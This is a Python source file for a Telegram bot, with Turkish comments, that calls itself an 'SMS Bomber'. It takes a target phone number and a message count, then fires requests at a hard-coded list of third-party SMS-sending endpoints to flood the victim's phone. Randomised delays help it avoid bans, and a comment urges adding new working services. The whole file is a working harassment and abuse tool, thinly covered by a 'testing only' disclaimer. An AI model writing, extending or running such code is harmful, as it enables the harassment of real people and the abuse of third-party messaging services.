# sms_bomber_simple_2026.py
# Python 3.11 | python-telegram-bot 21.x | httpx

import asyncio
import logging
import os
import random
from datetime import datetime

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Logging temiz olsun
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable'ı eksik!")

# 2026 Mart-Nisan yaşayan / yarı yaşayan servisler (sık güncellemek zorundasın)
SMS_APIS = [
    {
        "name": "kandilli mirror",
        "url": "https://api.kandilli.info/sms",
        "method": "GET",
        "params": {"phone": "{phone}", "amount": "{count}"},
    },
    {
        "name": "sms24 mirror",
        "url": "https://sms24api.vercel.app/send",
        "method": "GET",
        "params": {"to": "{phone}", "count": "{count}"},
    },
    {
        "name": "temp-number fallback",
        "url": "https://temp-number.org/api/sms",
        "method": "GET",
        "params": {"number": "{phone}", "amount": "{count}"},
    },
    # Yeni bir tane bulursan buraya ekle
]

MAX_COUNT = 120           # flood ban yememek için üst sınır
REQUEST_TIMEOUT = 10.0
DELAY_MIN, DELAY_MAX = 1.1, 3.4

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚀 *SMS Bomber 2026 Simple*\n\n"
        "Komutlar:\n"
        "  /sms     → bombardımana başla\n"
        "  /limit   → kalan hakkın\n"
        "  /cancel  → iptal et\n\n"
        "⚠ Sadece test için. Sorumluluk sende.",
        parse_mode=ParseMode.MARKDOWN_V2
    )


async def sms_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📱 *Telefon numarasını yaz*\n"
        "Örnek:  5391234567   ya da   905391234567\n"
        "(0 ile başlasa da otomatik düzeltirim)",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    context.user_data["state"] = "waiting_phone"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    text = update.message.text.strip()

    if state == "waiting_phone":
        phone = "".join(c for c in text if c.isdigit())
        if phone.startswith("0"):
            phone = "90" + phone[1:]
        elif len(phone) == 10:
            phone = "90" + phone

        if len(phone) != 12 or not phone.startswith("90"):
            await update.message.reply_text("❌ Geçersiz numara. Tekrar yaz.")
            return

        context.user_data["phone"] = phone
        context.user_data["state"] = "waiting_count"

        await update.message.reply_text(
            f"✅ Numara kaydedildi: `{phone}`\n\n"
            f"🔢 Kaç adet SMS göndereyim? (max {MAX_COUNT})",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    elif state == "waiting_count":
        try:
            count = int(text)
            if count < 1 or count > MAX_COUNT:
                await update.message.reply_text(f"1 ile {MAX_COUNT} arası sayı gir.")
                return
        except ValueError:
            await update.message.reply_text("Sayı yaz lütfen.")
            return

        context.user_data["count"] = count
        context.user_data["state"] = None

        phone = context.user_data["phone"]
        await update.message.reply_text(
            f"💣 *Bombardıman başlıyor…*\n"
            f"Numara → `{phone}`\n"
            f"Adet   → `{count}`\n"
            f"Lütfen biraz bekle...",
            parse_mode=ParseMode.MARKDOWN_V2
        )

        success, api_name = await fire_sms(phone, count)

        if success:
            msg = (
                f"✅ *Gönderim tamamlandı*\n"
                f"Servis: `{api_name}`\n"
                f"Numara: `{phone}`\n"
                f"Adet  : `{count}`\n"
                f"Saat  : {datetime.now().strftime('%H:%M:%S')}"
            )
        else:
            msg = (
                f"❌ *Hiçbir servis çalışmadı*\n"
                f"Numara: `{phone}`\n"
                f"Adet  : `{count}`\n"
                f"Muhtemel sebep: servisler banlanmış veya kapalı.\n"
                f"Birkaç saat sonra tekrar dene."
            )

        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)


async def fire_sms(phone: str, count: int) -> tuple[bool, str]:
    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
        for api in SMS_APIS:
            try:
                url = api["url"]
                if api["method"] == "GET":
                    params = {k: v.format(phone=phone, count=count) for k, v in api.get("params", {}).items()}
                    r = await client.get(url, params=params, timeout=REQUEST_TIMEOUT)
                else:
                    continue

                if r.status_code in (200, 201, 202):
                    logger.info(f"{api['name']} → OK | {r.text[:100]}")
                    await asyncio.sleep(random.uniform(0.8, 2.1))
                    return True, api["name"]

                logger.warning(f"{api['name']} → {r.status_code} | {r.text[:120]}")
                await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))

            except Exception as e:
                logger.error(f"{api.get('name', 'API')} patladı: {e}")

    return False, "hepsi başarısız"


async def show_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Basit günlük sayaç yok, istersen context.application.bot_data ile ekleyebiliriz
    await update.message.reply_text("Bu versiyonda günlük limit yok (istediğin kadar dene)")


def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(35).write_timeout(35).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sms", sms_start))
    app.add_handler(CommandHandler("limit", show_limit))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Simple SMS Bomber 2026 başlatıldı")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
